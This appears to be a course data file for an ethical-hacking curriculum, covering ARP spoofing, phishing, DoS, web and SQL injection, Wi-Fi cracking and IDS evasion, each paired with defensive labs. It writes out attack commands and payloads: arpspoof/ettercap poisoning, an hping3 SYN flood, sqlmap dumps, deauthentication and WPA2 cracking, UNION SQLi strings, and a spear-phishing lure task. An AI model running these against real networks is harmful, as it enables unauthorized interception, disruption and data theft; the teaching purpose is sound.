        { term: "Bettercap", definition: "A modular, portable, and extensible tool designed to perform active network reconnaissance and MITM attacks on Ethernet and wireless networks." }
      ],
      importantCommands: [
        { command: "arpspoof -i eth0 -t 192.168.1.10 -r 192.168.1.1", usage: "Poison ARP cache between target workstation (.10) and gateway (.1)", purpose: "ARP Poisoning" },
        { command: "tcpdump -i eth0 -nn -w capture.pcap 'tcp port 80'", usage: "Capture raw HTTP traffic to pcap file for offline analysis", purpose: "Packet Capture" },
        { command: "ettercap -T -q -M arp:remote /192.168.1.10// /192.168.1.1//", usage: "Run text-mode Ettercap MITM attack across target and router", purpose: "MITM Execution" }
      ],
      interviewPoints: [
        "Walk through the exact step-by-step mechanism of an ARP cache poisoning attack on an Ethernet LAN.",
        "How does HTTP Strict Transport Security (HSTS) protect web users from SSL stripping attacks?",
        "What network switch security feature completely prevents ARP spoofing on a local corporate network? (Answer: Dynamic ARP Inspection / DAI combined with DHCP Snooping)."
      ],
      commonMistakes: [
        "Executing ARP poisoning without enabling IP forwarding (`sysctl -w net.ipv4.ip_forward=1`), immediately causing a total denial of service for the victim.",
        "Failing to clean up ARP tables upon terminating a pentest, leaving victim ARP caches permanently poisoned.",
        "Assuming that modern HTTPS traffic can be trivially decrypted in Wireshark without possessing the server's private key or client SSL pre-master secrets."
      ]
    },
    assignment: {
      title: "ARP Spoofing & Wireshark Packet Inspection Lab",
      type: "Traffic Interception Lab",
      objective: "Demonstrate an authorized man-in-the-middle packet capture, extract plaintext credentials, and configure switch defenses.",
      difficulty: "MEDIUM",
      estimatedTime: "30 mins",
      maxScore: 100,
      instructions: [
        "Network Environment: Subnet 192.168.1.0/24. Gateway: 192.168.1.1. Target: 192.168.1.45. Attacker: 192.168.1.200.",
        "1. Write the Linux sysctl command to enable IP packet forwarding on the attacker system.",
        "2. Formulate the two `arpspoof` commands required to execute bidirectional ARP cache poisoning.",
        "3. Specify the exact Wireshark display filter to locate unencrypted HTTP POST login requests and extract usernames and passwords.",
        "4. Provide the Cisco switch configuration commands to enable DHCP Snooping and Dynamic ARP Inspection (DAI)."
      ],
      expectedOutput: "A complete MITM interception guide detailing `net.ipv4.ip_forward=1`, bidirectional arpspoof syntax, Wireshark filter (`http.request.method == 'POST'`), and Cisco switch commands (`ip arp inspection vlan 10`).",
      evaluationCriteria: [
        "Correct IP forwarding configuration",
        "Bidirectional arpspoof command accuracy",
        "Accurate switch security configuration (DHCP Snooping + DAI)"
      ],
      challengeSnippet: "TRAFFIC_INTERCEPT_LOG: Victim transmitting credentials over unencrypted FTP (port 21) and HTTP (port 80). Router MAC: 00:11:22:33:44:55."
    }
  },
  {
    id: 109,
    track: 'ethical-hacking',
    dayNumber: "DAY 09",
    title: "Social Engineering & Phishing Simulations",
    shortDesc: "Understand human cognitive vulnerabilities, Social-Engineer Toolkit (SET), phishing email campaigns, credential harvesters, and defenses.",
    category: "Social Engineering",
    estimatedMinutes: 70,
    topics: [
      "Psychology of Influence: Cialdini's Principles in Social Engineering",
      "Phishing, Spear Phishing, Vishing, Smishing & Whaling",
      "Social-Engineer Toolkit (SET) & Web Credential Harvester",
      "Simulated Phishing Platforms (GoPhish, KnowBe4)",
      "Technical Email Defenses: SPF, DKIM, DMARC & Security Awareness"
    ],
    notes: {
      quickRevision: [
        "Social engineering exploits the human element—widely considered the weakest link in enterprise cybersecurity defense.",
        "The primary psychological triggers: Authority, Scarcity, Urgency, Fear, Social Proof, and Reciprocity.",
        "The Social-Engineer Toolkit (SET) automates cloning of target login portals (like Microsoft 365 or Google Workspace) for simulated credential harvesting.",
        "Sender Policy Framework (SPF) specifies authorized sending mail servers in DNS; DKIM provides cryptographic signatures; DMARC enforces reject/quarantine policies.",
        "Phishing simulation campaigns must focus on education, positive reinforcement, and behavioral change rather than employee punishment."
      ],
      keyTerms: [
        { term: "Credential Harvester", definition: "A cloned web application designed to capture entered usernames and passwords and forward the victim to the real site." },
        { term: "DMARC (Domain-based Message Authentication, Reporting, and Conformance)", definition: "An email authentication protocol that uses SPF and DKIM to prevent email domain spoofing." },
        { term: "Pretexting", definition: "The act of creating an invented scenario or persona to persuade a targeted victim to release information or perform an action." },
        { term: "GoPhish", definition: "An open-source phishing simulation framework designed to test organizations' exposure to phishing attacks." }
      ],
      importantCommands: [
        { command: "setoolkit", usage: "Launch the interactive Social-Engineer Toolkit console", purpose: "Phishing Toolkit" },
        { command: "dig target.com TXT", usage: "Inspect SPF and DMARC DNS verification records", purpose: "Email Security Audit" }
      ],
      interviewPoints: [
        "How do you design a corporate phishing awareness campaign without alienating or humiliating employees who fail?",
        "Explain the exact interaction between SPF, DKIM, and DMARC in preventing CEO fraud and domain spoofing.",
        "What is reverse-proxy phishing (e.g. Evilginx2), and how does it successfully bypass traditional SMS and TOTP 2FA?"
      ],
      commonMistakes: [
        "Sending simulated phishing emails without first coordinating with the internal IT and SOC team, resulting in automated IP blacklisting.",
        "Failing to verify DMARC records: if DMARC is set to `p=reject`, an attacker cannot directly spoof the target company's exact domain.",
        "Punishing employees who fail simulated tests rather than providing immediate, interactive micro-learning modules."
      ]
    },
    assignment: {
      title: "Simulated Phishing Campaign & DMARC Policy Design",
      type: "Social Engineering Assessment",
      objective: "Design an ethical, educational phishing awareness campaign scenario and write an ironclad DMARC policy for an enterprise.",
      difficulty: "MEDIUM",
      estimatedTime: "25 mins",
      maxScore: 100,
      instructions: [
        "Target Company: Apex Global Finance (domain: `apexfinance.com`).",
        "1. Write a realistic spear-phishing email lure targeting the finance department (utilizing Urgency and Authority triggers).",
        "2. Identify the red flags in your lure that a trained employee should detect.",
        "3. Write the exact DNS TXT record to implement an enforcing DMARC policy (`p=reject`) with daily aggregate reporting to `dmarc-reports@apexfinance.com`.",
        "4. Formulate the corresponding SPF DNS record authorizing only Google Workspace servers."
      ],
      expectedOutput: "A complete Social Engineering Simulation Brief detailing the lure scenario, indicator checklist, valid SPF DNS record (`v=spf1 include:_spf.google.com ~all`), and strict DMARC record (`v=DMARC1; p=reject; rua=mailto:dmarc-reports@apexfinance.com`).",
      evaluationCriteria: [
        "Realistic, ethically calibrated corporate phishing lure",
        "Clear identification of psychological triggers and red flag indicators",
        "100% syntactically correct SPF and DMARC DNS records"
      ],
      challengeSnippet: "CAMPAIGN_PARAM: Spoofed Sender: HR Benefits Team. Target Group: Accounting. Objective: Measure credential submission rate on fake portal."
    }
  },
  {
    id: 110,
    track: 'ethical-hacking',
    dayNumber: "DAY 10",
    title: "Denial of Service (DoS/DDoS) & Botnets",
    shortDesc: "Understand DoS/DDoS mechanics, volumetric floods, Slowloris resource exhaustion, botnet command architectures, and mitigation.",
    category: "Availability Attacks",
    estimatedMinutes: 75,
    topics: [
      "DoS vs DDoS: Attack Vectors and Architectural Classifications",
      "Layer 4 Volumetric & Protocol Attacks (SYN Flood, UDP Flood, NTP Amplification)",
      "Layer 7 Application Attacks (HTTP Floods, Slowloris, Cache Busting)",
      "Botnet Architecture: IRC, HTTP, P2P C2 Command Networks & Mirai",
      "DDoS Defense: Anycast, Scrubbing Centers, Cloudflare & Rate-Limiting"
    ],
    notes: {
      quickRevision: [
        "Denial of Service (DoS) attacks aim to disrupt system availability rather than compromise confidentiality or data integrity.",
        "Volumetric attacks saturate physical network bandwidth using amplification protocols (NTP, DNS, SSDP, Memcached) that produce massive reply-to-request ratios.",
        "Protocol attacks (like TCP SYN Floods) exhaust intermediate state tables on stateful firewalls, load balancers, and web servers.",
        "Application-layer (Layer 7) attacks target web server application resources (CPU, RAM, database connections) using minimal bandwidth (e.g. Slowloris, search query fuzzing).",
        "Modern DDoS mitigation relies on Anycast routing to distribute traffic across distributed global scrubbing centers that filter malicious flows."
      ],
      keyTerms: [
        { term: "Amplification Attack", definition: "A form of DDoS where an attacker sends small requests with spoofed victim IPs to vulnerable third-party servers, which return disproportionately large responses." },
        { term: "Slowloris", definition: "A Layer 7 denial of service tool that keeps HTTP connections open as long as possible by sending incomplete HTTP headers at slow intervals." },
        { term: "Botnet", definition: "A network of compromised internet-connected computers, servers, or IoT devices controlled by a botmaster to execute distributed attacks." },
        { term: "Anycast", definition: "A network addressing routing technique where a single destination IP address is shared by multiple physical routing points." }
      ],
      importantCommands: [
        { command: "hping3 -c 1000 -d 120 -S -w 64 -p 80 --flood --rand-source 192.168.1.10", usage: "Simulate SYN flood testing with randomized source IPs", purpose: "SYN Flood Stress Test" },
        { command: "netstat -nat | grep SYN_RECV | wc -l", usage: "Count number of half-open TCP connections on server", purpose: "SYN Flood Detection" }
      ],
      interviewPoints: [
        "How does a DNS or NTP amplification attack achieve a 50x to 500x traffic amplification multiplier?",
        "What is the difference between a volumetric Layer 4 DDoS and a Layer 7 application flood, and how do defenses differ?",
        "Explain how SYN Cookies work at the Linux kernel level to defeat TCP SYN Flood attacks."
      ],
      commonMistakes: [
        "Attempting to mitigate application-layer Layer 7 attacks using standard network firewall rules that only inspect Layer 3/4 packet headers.",
        "Failing to enable SYN Cookies on web servers (`sysctl -w net.ipv4.tcp_syncookies=1`), leaving the system vulnerable to trivial connection backlog exhaustion.",
        "Testing DoS tools against public networks without explicit contractual authorization—DDoS testing is universally prohibited in almost all standard pentests."
      ]
    },
    assignment: {
      title: "SYN Flood Analysis & Kernel Defense Hardening",
      type: "Incident Mitigation Lab",
      objective: "Analyze a simulated SYN flood attack log and configure Linux kernel parameters to maintain web server availability.",
      difficulty: "HARD",
      estimatedTime: "30 mins",
      maxScore: 100,
      instructions: [
        "Scenario: An e-commerce server (Ubuntu 22.04) running Apache is experiencing a 50,000 req/sec SYN flood from randomized spoofed IP addresses.",
        "1. Identify the symptom in `netstat` output showing thousands of sockets stuck in `SYN_RECV` state.",
        "2. Formulate the `/etc/sysctl.conf` configuration parameters to enable SYN Cookies, increase the TCP backlog queue, and reduce SYN-ACK retries.",
        "3. Write an iptables rule to rate-limit new incoming TCP connections on port 80 to 25 connections per second per client IP.",
        "4. Recommend a cloud-based architectural defense (e.g. AWS Shield / Cloudflare) to absorb volumetric traffic before it hits the origin server."
      ],
      expectedOutput: "A complete Server Hardening Configuration Guide with exact sysctl directives (`net.ipv4.tcp_syncookies = 1`, `net.ipv4.tcp_max_syn_backlog = 4096`, `net.ipv4.tcp_synack_retries = 2`), iptables rate-limiting rule, and Anycast architecture diagram.",
      evaluationCriteria: [
        "Correct sysctl parameter naming and values for SYN cookie defense",
        "Valid iptables hashlimit or connlimit rule syntax",
        "Practical cloud Anycast scrubbing architecture recommendation"
      ],
      challengeSnippet: "DDoS_ALERT_LOG: TCP SYN packet rate: 45,000 pps. State: SYN_RECV backlog saturated (1024/1024). Web server status: 504 Gateway Timeout."
    }
  },
  {
    id: 111,
    track: 'ethical-hacking',
    dayNumber: "DAY 11",
    title: "Web Application Hacking & OWASP Top 10",
    shortDesc: "Audit web applications using Burp Suite, uncover Broken Access Control (BOLA/IDOR), Cross-Site Scripting (XSS), and SSRF flaws.",
    category: "Web Security",
    estimatedMinutes: 85,
    topics: [
      "The OWASP Top 10 Web Application Security Risks",
      "Burp Suite Intercepting Proxy, Repeater & Intruder Fuzzing",
      "Broken Object Level Authorization (BOLA / IDOR) Exploitation",
      "Cross-Site Scripting (XSS): Stored, Reflected & DOM-Based",
      "Server-Side Request Forgery (SSRF) & Cloud Metadata Access"
    ],
    notes: {
      quickRevision: [
        "Web applications represent the single largest exposed attack surface for modern enterprises.",
        "OWASP Top 10 ranks the most critical web application risks; A01 (Broken Access Control) is currently the #1 most prevalent flaw worldwide.",
        "Burp Suite acts as a Man-in-the-Middle proxy between your browser and the web server, allowing interception, inspection, and manipulation of HTTP/S traffic in real-time.",
        "Insecure Direct Object References (IDOR) occur when an application relies on client-provided object IDs (e.g. `user_id=105`) without validating authorization on the server.",
        "Cross-Site Scripting (XSS) allows attackers to inject malicious client-side JavaScript into web pages viewed by other users, enabling session hijacking and cookie theft.",
        "Server-Side Request Forgery (SSRF) tricks a backend server into fetching resources from internal, protected networks (such as AWS IMDSv1 `169.254.169.254`)."
      ],
      keyTerms: [
        { term: "OWASP Top 10", definition: "A regularly updated report outlining security concerns for web application security, focusing on the 10 most critical risks." },
        { term: "Burp Suite Repeater", definition: "A tool in Burp Suite that allows sending individual HTTP requests repeatedly with modifications to analyze server responses." },
        { term: "IDOR (Insecure Direct Object Reference)", definition: "An access control vulnerability where an application uses user-supplied input to access objects directly without authorization checks." },
        { term: "Stored XSS", definition: "A type of Cross-Site Scripting where malicious script input is permanently stored in a target database and served to all subsequent visitors." }
      ],
      importantCommands: [
        { command: "gobuster dir -u http://192.168.1.50 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt", usage: "Fuzz and discover hidden web directories and files", purpose: "Directory Fuzzing" },
        { command: "ffuf -w wordlist.txt -u http://target.com/FUZZ", usage: "High-speed web fuzzer for endpoints, parameters, and headers", purpose: "Web Fuzzing" }
      ],
      interviewPoints: [
        "Explain the critical difference between Reflected XSS, Stored XSS, and DOM-based XSS.",
        "How do you distinguish between Authentication (who you are) and Authorization (what you are allowed to do) in web security?",
        "What is the single most effective defense against Server-Side Request Forgery (SSRF) targeting cloud metadata services? (Answer: Enforcing AWS IMDSv2 token headers and URL white-listing)."
      ],
      commonMistakes: [
        "Relying on client-side JavaScript validation (e.g. HTML `required` or disabled buttons): an attacker using Burp Suite bypasses all client checks effortlessly.",
        "Failing to sanitize output: escaping input when writing to the database is insufficient; output encoding must match the context (HTML body, attribute, JavaScript block).",
        "Using sequential, predictable database IDs (1, 2, 3...) for sensitive objects instead of cryptographically secure UUIDv4 identifiers."
      ]
    },
    assignment: {
      title: "IDOR & Stored XSS Web Vulnerability Proof-of-Concept",
      type: "Web Application Pentest Lab",
      objective: "Identify an Insecure Direct Object Reference flaw and Cross-Site Scripting vulnerability in an HTTP transaction and formulate remediation.",
      difficulty: "HARD",
      estimatedTime: "35 mins",
      maxScore: 100,
      instructions: [
        "Target API Endpoint: `GET /api/v1/invoices?invoice_id=8943`.",
        "1. Explain how an attacker using Burp Suite Repeater can test for IDOR by tampering with the parameter.",
        "2. Craft a safe Proof-of-Concept XSS payload to prove JavaScript execution via an unescaped comment box (`<script>alert(document.domain)</script>`).",
        "3. Provide the secure server-side Node.js/Express code snippet that validates that `req.user.id` owns the requested `invoice_id` before returning data.",
        "4. Detail how to implement the `Content-Security-Policy` (CSP) HTTP header to mitigate XSS impact."
      ],
      expectedOutput: "A Web Vulnerability Finding Report with technical reproduction steps for IDOR, sanitized XSS PoC payload, secure authorization validation code, and strict CSP policy (`default-src 'self'`).",
      evaluationCriteria: [
        "Accurate identification of missing server-side authorization checks",
        "Valid XSS PoC demonstration without destructive behavior",
        "Correct server-side authorization check logic and Content-Security-Policy header"
      ],
      challengeSnippet: "HTTP_INTERCEPT_RAW: GET /api/v1/invoices?invoice_id=8943 HTTP/1.1. Host: app.bank.internal. Cookie: session=user_kapil_token_xyz."
    }
  },
  {
    id: 112,
    track: 'ethical-hacking',
    dayNumber: "DAY 12",
    title: "SQL Injection (SQLi) & Database Exploitation",
    shortDesc: "Master SQL injection mechanics, in-band UNION exploitation, blind boolean/time-based attacks, and automated testing with sqlmap.",
    category: "Injection Attacks",
    estimatedMinutes: 85,
    topics: [
      "SQL Architecture & Injection Flaw Mechanics",
      "In-Band SQLi: UNION-Based & Error-Based Exploitation",
      "Inferential (Blind) SQLi: Boolean-Based & Time-Based Delays",
      "Automated Database Enumeration & Dumping with Sqlmap",
      "Defenses: Prepared Statements, Parameterized Queries & ORM"
    ],
    notes: {
      quickRevision: [
        "SQL Injection occurs when untrusted user input is directly concatenated into SQL query strings rather than bound as separate data parameters.",
        "In-band SQLi uses the same channel of communication to launch the attack and gather results (either displayed directly on the screen or via database errors).",
        "`UNION SELECT` requires that the injected query matches the exact number and data types of columns in the original query.",
        "Blind SQLi occurs when the application is vulnerable to injection but does not display SQL results or errors; attackers infer data by testing true/false conditions or measuring response time delays (`WAITFOR DELAY` or `pg_sleep()`).",
        "Sqlmap is the industry-standard automated exploitation tool that detects injection points, identifies database management systems, and dumps schemas and tables.",
        "The definitive defense against all forms of SQL injection is the mandatory use of Parameterized Queries (Prepared Statements)."
      ],
      keyTerms: [
        { term: "SQL Injection (SQLi)", definition: "A vulnerability where an attacker manipulates a web application's database queries by injecting malicious SQL statements." },
        { term: "UNION-Based SQLi", definition: "A technique that uses the UNION operator to combine the results of the original query with the results of an injected query." },
        { term: "Time-Based Blind SQLi", definition: "An inferential SQLi technique that relies on forcing the database to pause for a specified amount of time before returning a response." },
        { term: "Prepared Statement", definition: "A pre-compiled SQL statement where parameters are parameterized separately from the query logic, completely neutralizing SQLi." }
      ],
      importantCommands: [
        { command: "sqlmap -u 'http://target.com/products.php?cat=1' --batch --dbs", usage: "Automatically detect SQLi and enumerate all database names", purpose: "Automated SQLi" },
        { command: "sqlmap -u 'http://target.com/login' --data='user=admin&pass=1' --tables -D corporate_db", usage: "Dump table names from specified database via POST request", purpose: "Database Dump" }
      ],
      interviewPoints: [
        "Why is input sanitization (like filtering single quotes) considered an inferior defense compared to Prepared Statements?",
        "Explain step-by-step how to manually determine the number of columns in a vulnerable query using `ORDER BY`.",
        "How does a time-based blind SQL injection extract passwords character-by-character? (Answer: Using substring functions combined with conditional delay commands like `IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0)`)."
      ],
      commonMistakes: [
        "Attempting to sanitize SQL queries with `addslashes()` or regex replace filters that can be bypassed using wide-byte characters (GBK) or alternative encodings.",
        "Using SQL concatenation inside stored procedures: stored procedures are NOT inherently safe unless they explicitly use parameter binding.",
        "Running aggressive sqlmap dump commands against production databases without rate-limiting, causing database table locking and downtime."
      ]
    },
    assignment: {
      title: "Manual UNION-Based SQLi & Prepared Statement Migration",
      type: "Database Security Lab",
      objective: "Manually reconstruct a UNION-based SQL injection exploit chain to dump user tables, then rewrite the vulnerable PHP code using PDO Prepared Statements.",
      difficulty: "HARD",
      estimatedTime: "35 mins",
      maxScore: 100,
      instructions: [
        "Vulnerable Code: `$query = \"SELECT id, name, price FROM products WHERE category = '\" . $_GET['cat'] . \"';\";`.",
        "1. Determine the exact payload to balance the single quote and balance column count using `ORDER BY`.",
        "2. Formulate the `UNION SELECT` payload to extract the current database user (`user()`) and database name (`database()`).",
        "3. Formulate the query to extract usernames and password hashes from `users` table (`username, password_hash`).",
        "4. Rewrite the PHP code using secure PHP Data Objects (PDO) with prepared statements."
      ],
      expectedOutput: "A complete SQLi Penetration Testing & Remediation Document detailing: Order By probe (`' ORDER BY 3-- -`), Union Select payload (`' UNION SELECT 1, user(), database()-- -`), table extraction syntax, and secure PHP PDO code implementation.",
      evaluationCriteria: [
        "Correct payload syntax with comment markers (`-- -` or `#`)",
        "Accurate column balancing logic",
        "100% secure PHP PDO code using `:category` named parameters and `prepare()->execute()`"
      ],
      challengeSnippet: "VULN_QUERY_RAW: SELECT id, title, price FROM items WHERE cat = '[INJECTION_POINT]' AND active = 1."
    }
  },
  {
    id: 113,
    track: 'ethical-hacking',
    dayNumber: "DAY 13",
    title: "Wireless & Wi-Fi Security Auditing",
    shortDesc: "Audit 802.11 wireless networks, capture WPA/WPA2 4-way handshakes, crack pre-shared keys, and detect rogue access points.",
    category: "Wireless Auditing",
    estimatedMinutes: 75,
    topics: [
      "802.11 Protocol Architecture, SSIDs, BSSIDs & Channels",
      "Wireless Encryption Flaws: WEP, WPA, WPA2-PSK & WPA3-SAE",
      "Aircrack-ng Suite: Monitor Mode, Packet Capture & Deauthentication",
      "Capturing and Cracking the WPA2 4-Way EAPOL Handshake",
      "Rogue Access Points, Evil Twins & WPA-Enterprise 802.1X Defenses"
    ],
    notes: {
      quickRevision: [
        "Wireless signals broadcast through physical airwaves, making physical perimeter boundaries obsolete without strong cryptographic encryption.",
        "WEP was broken due to small 24-bit Initialization Vectors (IVs) that repeat after 5,000–10,000 packets, allowing mathematical key recovery in under 2 minutes.",
        "WPA2-Personal relies on a 4-way EAPOL handshake; attackers transmit deauthentication frames to force clients to disconnect and reconnect, capturing the handshake for offline dictionary cracking.",
        "WPA3 implements Simultaneous Authentication of Equals (SAE), which provides forward secrecy and completely neutralizes offline dictionary attacks.",
        "Enterprise environments should deploy WPA2/WPA3-Enterprise using 802.1X authentication with RADIUS servers and client-side digital certificates (EAP-TLS)."
      ],
      keyTerms: [
        { term: "Monitor Mode", definition: "A wireless network card mode that captures all 802.11 frames passing through the air without associating with any specific access point." },
        { term: "4-Way Handshake", definition: "The EAPOL protocol exchange in WPA/WPA2 that confirms both client and AP know the pre-shared key and derives temporal encryption keys." },
        { term: "Deauthentication Attack", definition: "Transmitting spoofed 802.11 management frames pretending to be the AP, forcing a victim client to disconnect." },
        { term: "Evil Twin", definition: "A fraudulent Wi-Fi access point broadcasting the identical SSID of a legitimate network to intercept user traffic." }
      ],
      importantCommands: [
        { command: "airmon-ng start wlan0", usage: "Enable monitor mode on wireless interface wlan0", purpose: "Wireless Monitor Setup" },
        { command: "airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon", usage: "Capture 802.11 frames on channel 6 for specific AP to capture handshake", purpose: "Handshake Capture" },
        { command: "aireplay-ng -0 5 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon", usage: "Send 5 deauthentication frames to client to force 4-way handshake", purpose: "Deauthentication Attack" },
        { command: "aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap", usage: "Crack captured 4-way handshake against dictionary wordlist", purpose: "WPA2 PSK Cracking" }
      ],
      interviewPoints: [
        "Explain how the WPA2 4-way handshake works and why capturing it allows an attacker to crack the pre-shared key offline.",
        "How does WPA3's Dragonfly handshake (Simultaneous Authentication of Equals) prevent offline dictionary attacks?",
        "What is the difference between WPA2-Personal (PSK) and WPA2-Enterprise (802.1X), and why must enterprises use the latter?"
      ],
      commonMistakes: [
        "Sending continuous deauthentication floods instead of sending 2–3 brief frames, which disrupts network operations and alerts wireless intrusion prevention systems (WIPS).",
        "Failing to verify that an actual handshake was recorded (`[ WPA handshake: 00:11:22... ]` indicator in airodump-ng) before stopping the packet capture.",
        "Assuming that disabling SSID broadcast ('hidden network') or enabling MAC address filtering provides meaningful security—both are trivially bypassed."
      ]
    },
    assignment: {
      title: "WPA2 Handshake Analysis & Wireless Hardening",
      type: "Wireless Security Audit",
      objective: "Trace the 4-way EAPOL handshake capture workflow, analyze a captured `.cap` trace in Wireshark, and design an Enterprise 802.1X architecture.",
      difficulty: "MEDIUM",
      estimatedTime: "30 mins",
      maxScore: 100,
      instructions: [
        "Scenario: Corporate branch office using WPA2-PSK with SSID `Acme_Corp_Staff` on BSSID `00:14:6C:7E:40:80` on Channel 11.",
        "1. Write the sequential sequence of commands using `airmon-ng`, `airodump-ng`, and `aireplay-ng` to capture the 4-way handshake.",
        "2. Specify the Wireshark filter (`eapol`) used to verify that all 4 handshake messages (Message 1 of 4 through Message 4 of 4) were captured.",
        "3. Formulate the `aircrack-ng` command syntax to test the captured handshake against `rockyou.txt`.",
        "4. Architect a replacement WPA3-Enterprise solution utilizing FreeRADIUS and digital certificates."
      ],
      expectedOutput: "A complete Wireless Assessment & Architecture Document detailing: step-by-step terminal command workflow, Wireshark EAPOL verification filter, hash cracking syntax, and 802.1X/EAP-TLS hardening architecture.",
      evaluationCriteria: [
        "Correct order and parameter accuracy for aircrack-ng suite tools",
        "Understanding of EAPOL handshake frame verification in Wireshark",
        "Enterprise-grade wireless recommendation (802.1X EAP-TLS with certificate validation)"
      ],
      challengeSnippet: "WIFI_AUDIT_SPEC: BSSID: 00:14:6C:7E:40:80. Client MAC: 34:E6:D7:12:34:56. Channel: 11. Captured file: staff_handshake-01.cap."
    }
  },
  {
    id: 114,
    track: 'ethical-hacking',
    dayNumber: "DAY 14",
    title: "Evading IDS, Firewalls & Honeypots",
    shortDesc: "Understand network defenses, evasion techniques, packet fragmentation, decoy scanning, Proxychains, and honeypot detection.",
    category: "Defense Evasion",
    estimatedMinutes: 80,
    topics: [
      "Signature vs Anomaly vs Behavioral Intrusion Detection (IDS/IPS)",
      "Packet Fragmentation (-f) & MTU Manipulation Evasion",
      "Decoy Scanning (-D) & Source Port Spoofing (--source-port 53)",
      "Multi-Hop Anonymization with Proxychains & Tor",
      "Detecting and Evading Honeypots (Cowrie, Dionaea, Kippo)"
    ],
    notes: {
      quickRevision: [
        "Defense Evasion consists of techniques that adversaries and Red Teams use to avoid detection throughout their compromise lifecycle.",
        "Intrusion Detection Systems (like Snort, Suricata, and Zeek) inspect packets for known malicious signatures; modern IPS engines terminate offending connections in real-time.",
        "Packet Fragmentation (`nmap -f`) splits TCP headers across multiple IP packets, preventing older stateful inspection engines from reconstructing the complete header in memory.",
        "Decoy scanning (`nmap -D RND:10`) sends probes alongside probes from fake random IP addresses, obfuscating the real testing IP among noise in firewall logs.",
        "Honeypots are deliberately vulnerable deception environments designed to detect unauthorized access, waste attacker time, and gather threat intelligence."
      ],
      keyTerms: [
        { term: "IDS/IPS", definition: "Intrusion Detection/Prevention Systems that inspect network traffic for malicious activity and policy violations." },
        { term: "Packet Fragmentation", definition: "Breaking an IP datagram into smaller fragments to evade signature inspection buffers on network perimeter devices." },
        { term: "Decoy Scanning", definition: "An Nmap technique that mixes real port scan packets with packets from forged decoy source IP addresses." },
        { term: "Honeypot", definition: "A decoy computer system intended to mimic likely targets of cyberattacks to detect intrusions and gather threat intelligence." }
      ],
      importantCommands: [
        { command: "nmap -f -sS -p 80,443,445 192.168.1.10", usage: "Fragment packets into 8-byte chunks to evade simple signature buffers", purpose: "Fragment Evasion" },
        { command: "nmap -D RND:5,ME,RND:5 192.168.1.10", usage: "Scan target mixing real probe with 10 random spoofed decoy IP addresses", purpose: "Decoy Scan" },
        { command: "proxychains nmap -sT -Pn -p 80,443 192.168.1.10", usage: "Tunnel TCP connect scan through chained SOCKS proxies", purpose: "Proxychain Tunneling" }
      ],
      interviewPoints: [
        "Explain how modern Next-Generation Firewalls (NGFW) and Deep Packet Inspection (DPI) counter traditional packet fragmentation evasion techniques.",
        "How can a penetration tester identify whether an open SSH port is a real production server or a Cowrie honeypot?",
        "What is the operational difference between routing traffic through Tor versus using a dedicated private SOCKS5 proxy chain?"
      ],
      commonMistakes: [
        "Using SYN stealth scanning with Proxychains: Proxychains operates at the application layer and only supports full TCP Connect scans (`-sT`), failing with raw SYN probes (`-sS`).",
        "Assuming that running an evasion technique guarantees invisibility: enterprise SOCs correlate behavioral anomalies that trigger even if signatures are bypassed.",
        "Failing to check for honeypot indicators (such as fake system uptime, default SSH keys, and uncharacteristically slow command responses)."
      ]
    },
    assignment: {
      title: "Firewall Evasion Analysis & Next-Gen IDS Defense",
      type: "Defense Evasion Lab",
      objective: "Formulate an evasion strategy using Nmap flags and configure Snort rules to detect fragmented and decoy scan techniques.",
      difficulty: "HARD",
      estimatedTime: "35 mins",
      maxScore: 100,
      instructions: [
        "Target Firewall: Inspects TCP traffic on port 80 and 445.",
        "1. Write an Nmap command that combines: Packet Fragmentation (`-f`), MTU override (`--mtu 24`), Source Port Spoofing from DNS port 53 (`-g 53`), and 5 Decoy IPs (`-D`).",
        "2. Explain why source port 53 (DNS) or 88 (Kerberos) was historically permitted through legacy firewall rules.",
        "3. Write a Snort IDS rule that detects TCP packets arriving with abnormal IP fragmentation or tiny fragment offsets.",
        "4. Formulate the Next-Generation Firewall (NGFW) policy configuration to enforce full TCP packet stream reassembly before deep packet inspection."
      ],
      expectedOutput: "A complete Evasion & Detection Technical Paper featuring: combined Nmap evasion command, protocol historical rationale, functional Snort rule (`alert ip any any -> any any (fragbits:M; msg:\"Suspicious IP Fragmentation Detected\"; sid:1000001;)`), and NGFW reassembly guidelines.",
      evaluationCriteria: [
        "Correct syntax for advanced Nmap evasion flags (`-f`, `--mtu`, `-g`, `-D`)",
        "Accurate Snort rule syntax detecting fragmented packets",
        "Robust enterprise defensive recommendations (protocol normalizers, stateful stream reassembly)"
      ],
      challengeSnippet: "EVASION_SPEC: Target: 10.10.10.100. Firewall Rule: Permits incoming UDP/TCP traffic originating from port 53. Inspection buffer: 16 bytes."
    }
  },
  {
    id: 115,
    track: 'ethical-hacking',
    dayNumber: "DAY 15",
    title: "Penetration Testing Capstone & Reporting",
    shortDesc: "Execute a full end-to-end simulated penetration test, perform privilege escalation, and author an executive remediation report.",
    category: "Capstone & Career",
    estimatedMinutes: 90,
    topics: [
      "End-to-End Penetration Testing Execution Lifecycle (PTES)",
      "Linux Privilege Escalation: SUID Binaries, Sudo Misconfigs & Capabilities",
      "Windows Privilege Escalation: Token Impersonation & Unquoted Service Paths",
      "Active Directory Lateral Movement: Pass-The-Hash & Kerberoasting Basics",
      "Authoring Executive Summaries, Technical Findings & Remediation Roadmaps"
    ],
    notes: {
      quickRevision: [
        "The Capstone synthesizes all 15 days into a cohesive professional engagement: Recon -> Scanning -> Exploitation -> Privilege Escalation -> Reporting.",
        "Privilege Escalation transitions access from a low-privilege service account (e.g. `www-data` or `local user`) to administrative root or `SYSTEM` authority.",
        "Linux privilege escalation common vectors: SUID permissions (`find / -perm -u=s`), overly permissive sudo rules (`sudo -l`), writable cron jobs, and unpatched kernel exploits (Dirty COW/PwnKit).",
        "A penetration test without an actionable, executive-ready report is of zero value to an organization.",
        "Professional reporting requires two distinct sections: an Executive Summary translating technical vulnerabilities into business risk, and a Technical Appendix with reproducible proof-of-concept steps."
      ],
      keyTerms: [
        { term: "PTES (Penetration Testing Execution Standard)", definition: "A comprehensive framework defining the standardized phases of a complete commercial penetration test." },
        { term: "Privilege Escalation", definition: "The act of exploiting a bug, design flaw, or configuration oversight in an operating system to gain elevated access." },
        { term: "SUID (Set Owner User ID)", definition: "A special Linux file permission that allows users to execute a file with the permissions of the file owner (often root)." },
